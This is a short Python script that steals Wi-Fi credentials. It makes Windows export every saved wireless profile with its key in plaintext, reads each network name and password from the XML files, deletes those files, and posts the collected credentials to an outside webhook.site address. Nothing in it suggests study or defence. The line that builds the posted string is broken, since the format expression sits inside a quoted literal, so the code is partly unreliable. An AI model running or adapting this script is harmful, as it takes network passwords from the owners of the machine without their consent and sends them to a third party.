import subprocess, os, sys, requests
import xml.etree.ElementTree as et
url = 'https://webhook.site/24715d58-136b-4013-a7cf-b319a1417d76'

wifi_files = []
payload = {"SSID" :[], "Password":[]}

command = subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], capture_output=True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)


for file in wifi_files:
    tree = et.parse(file)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload["SSID"].append(SSID)
    payload["Password"].append(password)
    os.remove(file)


payload_str = " & ".join("%S=%S % (k,v) for k,v in payload.items()")
r = requests.post(url, params='format=json', data=payload_str)